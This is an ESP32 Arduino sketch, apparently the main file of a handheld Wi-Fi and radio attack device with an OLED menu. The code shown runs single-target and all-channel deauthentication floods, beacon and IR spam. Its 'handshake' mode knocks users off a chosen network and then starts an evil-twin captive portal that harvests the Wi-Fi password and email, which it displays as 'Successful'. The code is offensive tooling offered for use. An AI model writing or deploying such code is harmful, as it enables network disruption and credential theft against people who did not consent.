#include <Adafruit_GFX.h>
#include <Adafruit_SSD1306.h>
#include <WiFi.h>

#include "beacon.h"
#include <esp_system.h>
#include "types.h"
#include "esp_wifi.h"
#include "config.h"
#include "web_interface.h"
#include "deauth.h"
#include "definitions.h"
#include "evil_portal.h"
#include "ir_controll.h"
#include "rfid_controll.h"
#include "ble_spam.h"


int curr_channel = 1;
int last_push_btn_time = 0;
int time_to_sleep = 60000;

bool display_power_state = true;
bool wifi_connect_state = false;
bool connect_menu = false;
bool scan_menu = false;
bool deauth_menu = false;
bool handshake_menu = false;
bool all_deauth_state = false;
bool beacon_spam_state = false;


String wifi = "Test";
short wifiScroll = 0;


Adafruit_SSD1306 display(SCREEN_WIDTH, SCREEN_HEIGHT, &Wire, -1);

void playStartupTone() {
  int melody[] = {NOTE_C4, NOTE_E4, NOTE_G4, NOTE_C5};
  int noteDurations[] = {200, 200, 200, 400}; 

  for (int i = 0; i < 4; i++) {
    ledcWriteTone(0, melody[i]);
    delay(noteDurations[i]);
  }
  ledcWriteTone(0, 0); 
}

void handle_animate() {
  int num = random(0, 6);
  switch (num)
  {
  case 0:
    animateBitmapAppearFade(intro1, 128, 64, 1000);
    break;
  case 1:
    animateBitmapAppearFade(intro2, 43, 64, 1000);
    break;
  case 2:
    animateBitmapAppearFade(intro3, 114, 64, 1000);
    break;
  case 3:
    animateBitmapAppearFade(intro4, 124, 64, 1000);
    break;
  case 4:
    animateBitmapAppearFade(intro5, 124, 64, 1000);
    break;
  case 5:
    animateBitmapAppearFade(intro6, 124, 64, 1000);
    break;
  }
}

void setup() {
  pinMode(BTN_UP_PIN, INPUT_PULLUP);
  pinMode(BTN_DOWN_PIN, INPUT_PULLUP);
  pinMode(BTN_SELECT_PIN, INPUT_PULLUP);
  ledcSetup(0, 2000, 8);   
  ledcAttachPin(BUZZER_PIN, 0);

  WiFi.disconnect();
  
  if(!display.begin(SSD1306_SWITCHCAPVCC, 0x3C)) {
    Serial.println(F("Display error"));
    while(true);
  }

  display.setTextSize(1);
  display.setTextColor(SSD1306_WHITE);
  display.clearDisplay();
  display.display();

  loadingAnimation();
  handle_animate();

  last_push_btn_time = millis(); 
  
#ifdef SERIAL_DEBUG
  Serial.begin(115200);
#endif
#ifdef LED
  pinMode(LED, OUTPUT);
#endif

  WiFi.mode(WIFI_MODE_AP);
  WiFi.softAP(AP_SSID, AP_PASS);

  start_web_interface();
  playStartupTone();
}


void loop() {
  if (deauth_type == DEAUTH_TYPE_ALL)
  {
    if (curr_channel > CHANNEL_MAX) curr_channel = 1;
    esp_wifi_set_channel(curr_channel, WIFI_SECOND_CHAN_NONE);
    curr_channel++;
    delay(10);
  } 
  else {
    if (portalRunning)
    {
      updateCaptivePortal();
    }
    else {
      web_interface_handle_client();
    }
  }

  if (irSpam)
  {
    irSpamAllProtocols();
  }
  
  checkSleep();
  if (!display_power_state) return;

  btnHandler();
  drawMenu();
}

void connectToWiFi() {
  String password = "";
  start_input(&password);

  WiFi.begin(wifi.c_str(), password.c_str());
  unsigned long startAttemptTime = millis();

  while (WiFi.status() != WL_CONNECTED && millis() - startAttemptTime < 15000) {
    display.clearDisplay();
    drawStatusBar();
    display.setCursor(0, 20);
    display.println("Connecting...");
    display.display();
    delay(500);
  }

  display.clearDisplay();
  drawStatusBar();
  display.setCursor(0, 20);
  if (WiFi.status() == WL_CONNECTED) {
    display.println("Connected!");
    wifi_connect_state = true;
  } else {
    display.println("Failed.");
    wifi_connect_state = false;
  }

  display.display();
  delay(2000);
}


void checkSleep()
{
  bool btn_pressed = !digitalRead(BTN_UP_PIN) || !digitalRead(BTN_SELECT_PIN) || !digitalRead(BTN_DOWN_PIN);

  if (btn_pressed)
  {
    if (!display_power_state)
    {
      display.ssd1306_command(SSD1306_DISPLAYON);
      display_power_state = true;
    }
    last_push_btn_time = millis(); 
    delay(20);
  }
  
  if (display_power_state)
  {
    if (millis() - last_push_btn_time >= time_to_sleep)
    {
      display_power_state = false;
      display.ssd1306_command(SSD1306_DISPLAYOFF);
      delay(20);
    } 
  }
}


std::vector<std::pair<String, int>> scanWiFiNetworks() {
  std::vector<std::pair<String, int>> networks;

  int n = WiFi.scanNetworks();
  if (n == 0) {
    networks.push_back({"No networks found", 0});
  } else {
    for (int i = 0; i < n; ++i) {
      String ssid = WiFi.SSID(i);
      int rssi = WiFi.RSSI(i);
      networks.push_back({ssid, rssi});
    }
  }

  return networks;
}


void wait_for_stop()
{
  while (true)
  {
    if (portalRunning)
    {
      updateCaptivePortal();
    }
    else {
      web_interface_handle_client();
    }

    if (irSpam)
    {
      irSpamAllProtocols();
    }

    if (beacon_spam_state)
    {
      BeaconSpam();
    }

    if (digitalRead(BTN_SELECT_PIN) == LOW) {
      last_push_btn_time = 0;
      
      if (irSpam)
      {
        irSpam = false;
        delay(200);
        return;
      }

      if (portalRunning)
      {
        stopCaptivePortal();
        delay(100);
        
        WiFi.mode(WIFI_MODE_AP);
        WiFi.softAP(AP_SSID, AP_PASS);

        start_web_interface();
        delay(200);
        return;
      }

      if (beacon_spam_state)
      {
        beacon_spam_state = false;
        delay(200);
        return;
      }

      if (all_deauth_state)
      {
        ESP.restart();
        all_deauth_state = false;
        return;
      }
      else
      {
        stop_deauth();
        delay(200);
        return;
      }
    }

    display.clearDisplay();
    if (isCaptured)
    {
      display.setCursor(0, 0);
      display.println("Successful");

      if (capturedEmail != "")
      {
        display.println("Email:");
        display.println(capturedEmail);
        display.println("Pass:");
        display.println(capturedPassword);
      }
      else
      {
        display.println("Pass:");
        display.println(capturedPassword);
      }
      display.setCursor(0, 50);
      display.println("-> SELECT to stop");
    }
    
    else 
    {
      display.setCursor(0, 0);
      display.println("ATTACK...");
      display.drawLine(0, 9, SCREEN_WIDTH - 1, 9, SSD1306_WHITE);
      display.drawBitmap(0, 9, dead_image, 128, 64, SSD1306_WHITE);
    }
    display.display();
  }
}

void start_captive_pass_portal(String* wifi)
{
  server.stop();
  delay(200);
  
  start_deauth(wifiScroll, DEAUTH_TYPE_SINGLE, 2);
  unsigned long deauthStart = millis();

  while (millis() - deauthStart < 60000) {
      display.clearDisplay();
      display.setCursor(0, 20);
      display.println("Deauth running...");
      display.display();
      delay(100);
  }
  stop_deauth();
  
  startCaptivePortal(wifi, false);
  wait_for_stop();
}

void get_wifi() 
{
  display.clearDisplay();
  WiFi.mode(WIFI_STA);
  WiFi.disconnect();
  delay(150);

  auto networks = scanWiFiNetworks();
  int totalNetworks = networks.size();
  wifiScroll = 0;

  while (true)
  {
    checkSleep();

    if (digitalRead(BTN_SELECT_PIN) == LOW) {
      if (scan_menu){
        scan_menu = false;
       return; 
      }
      if (connect_menu){
        wifi = networks[wifiScroll].first;
        delay(200);
        connectToWiFi();
        connect_menu = false;
        return;
      }
      if (deauth_menu){
        wifi = networks[wifiScroll].first;
        delay(200);
        start_deauth(wifiScroll, DEAUTH_TYPE_SINGLE, 2);
        deauth_menu = false;
        wait_for_stop();
        return;
      }
      if (handshake_menu){
        wifi = networks[wifiScroll].first;

        start_captive_pass_portal(&wifi);

        handshake_menu = false;
        return;
      }
      delay(150);
    }

    if (digitalRead(BTN_DOWN_PIN) == LOW) {
      if (wifiScroll < totalNetworks - 1) {
        wifiScroll++;
        delay(150);
      }
    }

    if (digitalRead(BTN_UP_PIN) == LOW) {
      delay(150);
      return;
    }

    display.clearDisplay();
    drawStatusBar();

    short selectedWifiIndex = wifiScroll; 

    for (int i = 0; i < 6; ++i) {
      int idx = wifiScroll + i;
      if (idx >= totalNetworks) break;
    
      display.setCursor(0, 10 + i * 10);
      if (idx == selectedWifiIndex) {
        display.print("-> ");   
      } else {
        display.print("   ");  
      }
    
      display.print(networks[idx].first);
      display.print(" ");
      display.print(networks[idx].second);
      display.println("dBm");
    }

    display.display();
  }
}